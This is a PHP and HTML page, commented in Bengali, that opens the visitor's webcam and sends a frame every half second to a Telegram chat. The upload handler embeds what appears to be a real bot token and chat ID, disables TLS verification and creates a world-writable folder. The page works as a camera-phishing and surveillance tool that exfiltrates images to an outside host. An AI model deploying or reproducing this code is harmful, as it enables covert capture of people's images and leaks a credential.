<?php
// ব্যাকএন্ড লজিক: ফ্রন্টএন্ড থেকে আসা ছবি পোস্ট রিকোয়েস্টে প্রসেস করা
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931";

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "Ultra-fast captured: " . $fileName,
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);

        echo "Ultra-fast sent!";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Camera Capture - 0.5s</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f4f9;
        }
        #video {
            width: 100%;
            max-width: 400px;
            border: 2px solid #333;
            border-radius: 8px;
        }
        #status {
            margin-top: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h2>ক্যামেরা লোড হচ্ছে...</h2>
    
    <video id="video" autoplay playsinline></video><br>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <div id="status">দয়া করে ক্যামেরা পারমিশন দিন...</div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');

        // ক্যামেরা এক্সেস পাওয়া
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                statusDiv.innerText = "ক্যামেরা সচল আছে, প্রতি ০.৫ সেকেন্ডে ছবি পাঠানো হচ্ছে...";
                statusDiv.style.color = "green";

                // ক্যামেরা চালুর ১ সেকেন্ড পর থেকে প্রতি ৫০০ মিলিমিটার (০.৫ সেকেন্ড) পর পর ক্যাপচার
                setTimeout(() => {
                    setInterval(captureAndUpload, 500);
                }, 1000);

            })
            .catch(err => {
                console.error("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
                statusDiv.innerText = "ক্যামেরা পারমিশন দেওয়া হয়নি!";
                statusDiv.style.color.color = "red";
            });

        // অটো ক্যাপচার ও পোস্ট করার ফাংশন
        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData)
            })
            .then(response => response.text())
            .then(result => {
                console.log(result);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
